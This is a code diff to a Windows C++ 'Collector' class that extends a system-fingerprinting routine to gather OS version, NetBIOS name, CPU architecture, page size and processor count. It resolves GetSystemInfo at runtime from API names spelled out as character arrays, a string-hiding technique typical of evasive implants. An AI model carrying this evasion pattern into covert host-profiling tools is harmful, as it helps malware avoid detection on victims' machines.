@@ -86,7 +86,8 @@ auto Collector::GetWindowsVersion() const->std::wstring
 		if (hmKernel32)
 		{
 			FreeLibrary_p =
-				reinterpret_cast<FreeLibrary_t>(GetProcAddress(hmKernel32, reinterpret_cast<LPCSTR>(sFreeLibrary)));
+				reinterpret_cast<FreeLibrary_t>(
+					GetProcAddress(hmKernel32, reinterpret_cast<LPCSTR>(sFreeLibrary)));
 		}
 		else
 		{
@@ -139,8 +140,69 @@ auto Collector::FingerPrintSystem() const -> std::vector<std::wstring>
 	const std::wstring windowsVersion = GetWindowsVersion();
 	const std::wstring netBiosName = GetNetBIOSName();
 
-	std::vector<std::wstring> ret;
-	ret.push_back(windowsVersion);
-	ret.push_back(netBiosName);
-	return ret;
+	// Dynamically resolving GetSystemInfo()
+	SYSTEM_INFO si;
+
+	constexpr wchar_t wsKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+
+	const HMODULE hmKernel32 = GetModuleHandle(wsKernel32);
+
+	typedef void(WINAPI* GetSystemInfo_t)(LPSYSTEM_INFO);
+
+	constexpr unsigned char sGetSystemInfo[] = { 'G', 'e', 't', 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o', 0x0 };
+
+	if (hmKernel32)
+	{
+		const auto GetSystemInfo_p =
+			reinterpret_cast<GetSystemInfo_t>(
+				GetProcAddress(hmKernel32, reinterpret_cast<LPCSTR>(sGetSystemInfo)));
+
+		GetSystemInfo_p(&si);
+
+		// Getting processor architecture
+		std::wstring arch;
+		switch (si.wProcessorArchitecture)
+		{
+		case PROCESSOR_ARCHITECTURE_AMD64:
+			arch = L"x64 (AMD or Intel)";
+			break;
+		case PROCESSOR_ARCHITECTURE_ARM:
+			arch = L"ARM";
+			break;
+		case PROCESSOR_ARCHITECTURE_ARM64:
+			arch = L"ARM64";
+			break;
+		case PROCESSOR_ARCHITECTURE_IA64:
+			arch = L"Intel Itanium-based";
+			break;
+		case PROCESSOR_ARCHITECTURE_INTEL:
+			arch = L"x86";
+			break;
+		default:
+			arch = L"Unknown architecture.";
+			break;
+		}
+
+		// Page size
+		std::wstringstream ss;
+		ss << si.dwPageSize;
+		std::wstring pageSize = ss.str();
+
+		// Number of processors
+		ss.str(std::wstring());
+		ss << si.dwNumberOfProcessors;
+		std::wstring numberOfProcessors = ss.str();
+
+		std::vector<std::wstring> ret;
+		ret.push_back(windowsVersion);
+		ret.push_back(netBiosName);
+		ret.push_back(arch);
+		ret.push_back(pageSize);
+		ret.push_back(numberOfProcessors);
+		return ret;
+	}
+	else
+	{
+		ExitProcess(GetLastError());
+	}
 }
